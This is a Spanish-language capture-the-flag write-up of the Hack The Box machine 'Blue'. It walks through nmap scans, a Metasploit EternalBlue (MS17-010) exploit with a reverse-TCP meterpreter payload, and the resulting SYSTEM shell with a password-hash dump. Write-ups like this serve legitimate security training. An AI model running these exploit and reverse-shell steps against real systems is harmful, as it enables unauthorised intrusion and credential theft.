# 🖥️ HTB: Blue

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Blue |
| **Plataforma** | Hack The Box |
| **Dificultad** | Easy |
| **Categoría** | Windows / EternalBlue |
| **IP** | 10.10.10.40 |
| **OS** | Windows 7 |
| **Fecha** | 2024 |
| **Tiempo** | 30 min |

---

## 🎯 Resumen Ejecutivo

> Exploté **EternalBlue (MS17-010)** en SMB para obtener una shell SYSTEM directamente. Máquina clásica para aprender exploit development y metasploit.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_blue.txt 10.10.10.40
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 135 | MSRPC | Microsoft Windows RPC | Open |
| 139 | SMB | Microsoft Windows 7 | Open |
| 445 | SMB | Microsoft Windows 7 | Open |

**Hallazgo crítico:** Windows 7 + SMB = candidato a EternalBlue.

### Vulnerability Scan

```bash
nmap --script=vuln -p 445 10.10.10.40
```

**Resultado:**
```
Host script results:
|_smb-vuln-ms17-010: VULNERABLE
|   State: VULNERABLE
|   Risk factor: HIGH
|   Description:
|     Windows Server 2008 R2 and Windows 7 are vulnerable to a remote code execution vulnerability...
```

---

## 💥 Explotación

### Vulnerabilidad

**CVE:** CVE-2017-0144 (EternalBlue)
**MS Bulletin:** MS17-010
**CVSS:** 9.8 (Critical)
**Descripción:** Vulnerabilidad de ejecución remota de código en SMBv1. Utilizada por WannaCry y NotPetya.

### Payload

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.x
exploit
```

**Resultado:**
```
[*] Started reverse TCP handler on 10.10.14.x:4444
[*] 10.10.10.40:445 - EternalBlue...
[*] Sending stage (202698 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened
```

### Shell Obtenida

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\LegacyAppServ\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

```bash
meterpreter > cat "C:\Users\Administrator\Desktop\root.txt"
FLAG{...}
```

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Nmap script vuln detectó MS17-010 inmediatamente
- Metasploit tiene exploit estable para EternalBlue
- La máquina estaba desactualizada intencionalmente

### ❌ Lo que NO funcionó
- Intenté SMB con usuario vacío (no funcionó)
- EternalBlue puede ser inestable en algunas configuraciones

### 🔄 Qué haría diferente
- Usar `ms17_010_psexec` como alternativa si eternalblue falla
- Verificar arquitectura (x64 vs x86) antes del payload

---

## 📚 Referencias

- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [MITRE ATT&CK: T1210](https://attack.mitre.org/techniques/T1210/)
- [Microsoft MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

---

*Writeup creado para CDPN — Nivel Fácil*
